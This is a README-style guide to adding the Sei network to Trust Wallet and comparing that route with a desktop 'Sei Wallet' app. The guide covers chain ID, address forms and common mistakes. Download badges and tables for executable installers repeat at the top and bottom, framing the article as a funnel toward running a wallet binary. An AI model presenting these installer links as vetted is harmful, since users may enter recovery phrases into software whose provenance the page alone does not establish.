![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Adding Sei to Trust Wallet, or holding it in Sei Wallet</h1>

<p align="center">Set the network up in Trust Wallet, or hold SEI where staking works.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Trust Wallet is a general EVM wallet: it ships with a set of networks and lets you add others. Sei is added as a custom EVM network — chain ID 1329, the public Sei RPC from Sei's documentation, symbol SEI — after which the wallet can hold and send SEI like any other EVM asset.

That works, and it is a reasonable choice if you already use Trust Wallet for other chains. What it does not give you is staking, an unbonding view, or a Sei-specific interface; those are what [the desktop alternative](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) is for.

## What "adding a network" means

A network entry is four or five fields: name, RPC endpoint, chain ID, currency symbol, and often an explorer URL. The wallet uses the RPC to read balances and broadcast, and the chain ID to sign for the right network.

Get one field wrong and the symptoms are specific:

- **Wrong chain ID** — transactions are rejected, or signed for a network that does not know your account.
- **Wrong RPC** — the wallet connects but shows stale or empty data.
- **Wrong symbol** — cosmetic, but confusing when a balance displays with the wrong ticker.

The values are published in Sei's documentation, which is the authority here because endpoints change. The two forms of an address are a separate question, covered in [the dual address question](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md).

## The address you get

An EVM wallet derives an address from your phrase using the Ethereum path, so the address it shows for Sei is the same `0x…` address any EVM-first application would show for that phrase. That is a feature: your Sei account is not tied to a wallet.

Two consequences:

- **Importing the same phrase into this desktop app should show the same `0x…` account**, because both use the EVM derivation. If it does not, the derivation differs, and the fix is to add accounts until the expected address appears.
- **A `sei1…` address is a different representation of the same account**, not a second wallet. Sending to it from an EVM wallet is a route most interfaces cannot complete, which is why the form matters.

If you migrated from a Cosmos-first wallet, you may be holding a `sei1…` account whose funds are not visible in an EVM wallet until the association exists. The two-address-form problem is the article for that state, and it is the single most common reason a "correct" address shows an empty balance.

## Adding Sei, step by step

1. Open the wallet's network management screen and choose to add a custom network.
2. Enter the network name, the RPC endpoint, chain ID 1329, symbol SEI, and the explorer URL from Sei's documentation.
3. Save, then switch to the new network.
4. Copy the receive address **after** switching — the address field changes with the network in some wallets, and copying before switching is how people send to the wrong chain.
5. Send a small test amount from wherever your SEI currently sits.
6. Confirm it appears and is spendable before moving the rest.

Step 4 is worth a second look: in a multi-chain wallet the address displayed is usually the same EVM address on every network, but the balance is per network. Confirming which network is selected is the check that matters.

## What this route does well

- **One interface for many EVM chains**, which is the reason to use a general wallet in the first place.
- **Standard EVM compatibility**: contract interactions, tokens and applications built for Sei's EVM side work the same way they do elsewhere.
- **Hardware wallet support**, if the wallet offers it, with the same address-derivation caveats as any other EVM interface.

## What it does not do

- **No staking interface.** Delegation exists on Sei, but this wallet will not show validators or rewards. Staking a balance held here means using an interface that supports it.
- **No unbonding visibility.** A position staked elsewhere will not appear, and neither will the countdown.
- **No Sei-specific guidance.** A generic wallet treats Sei like any EVM chain, which is fine until the two-address system or the deposit-memo question comes up.

None of that makes it unsafe. It makes it narrow.

## The failure modes worth knowing

**Sending on the wrong network.** With several networks in one wallet, the selected network is a setting people forget. The transfer is final on whichever chain it was sent on.

**A copy-pasted address from another chain.** EVM addresses look identical across chains, so an address copied from an Ethereum session is a valid Sei address too — for a different account, if it was never yours on Sei.

**A lookalike network entry.** Anyone can publish a chain-ID-and-RPC pair. A malicious RPC can show you false balances and false confirmations; it cannot sign for you, but it can mislead you. Add networks from documentation, not from a message.

**Assuming a pending deposit is lost.** Exchanges wait for confirmations, and wallets sometimes lag. [A pending transfer](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) is usually a waiting problem rather than a loss.

## Which to use

Use the general wallet if your activity spans chains and you want one place for all of it. Use the desktop app if you want staking, unbonding and the two-form address model handled explicitly rather than left to you.

If you are comparing general EVM wallets rather than committing to one, [Rabby, Phantom and the rest](https://github.com/sei-chain/sei-wallet-setup/blob/main/use-rabby-phantom-or-a-desktop-app.md) sets out what each route does differently.

Running both is normal, and the rule is the one that applies everywhere: every application you import a phrase into is another place it can leak from. If you want both, consider separate phrases for the two roles rather than one phrase in two places.

The MetaMask route has its own setup and its own traps, and [the MetaMask approach](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) covers it if you are choosing a general EVM wallet rather than already owning one.

## Frequently asked questions

**Does Trust Wallet support Sei?** It supports custom EVM networks, so Sei can be added with chain ID 1329 and Sei's RPC. Check the current app version for the exact menu path, since interfaces change.

**Will my address be the same as in Sei Wallet?** The `0x…` address should be, if both use the Ethereum derivation. A different address means a different derivation, not a different account of yours.

**Can I stake from Trust Wallet?** Not through a Sei staking interface; delegation needs an interface that supports it. Holding and sending work normally.

**What if my SEI is in a `sei1` address?** You are looking at the Cosmos-side representation. Association and visibility are the questions, and they are covered in the address-format article.

**Which is safer?** Neither by construction. Both sign with keys on your device, and both depend on you verifying what you approve.

**Do I need to add Sei to receive it?** Yes — the network entry has to exist before the wallet can display the balance, even though the funds are already at the address on-chain.

**What if the balance shows zero after adding?** Confirm the network is selected, the chain ID is 1329, and the account is the one you expect. [The EVM compatibility article](https://github.com/sei-chain/sei-wallet-setup/blob/main/evm-compatibility-explained.md) explains what a compatible EVM wallet should and should not be able to do on Sei.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [A pending or failed transaction in Sei Wallet](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md)
- [Sei in Rabby, Phantom and other EVM wallets, or in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/use-rabby-phantom-or-a-desktop-app.md)
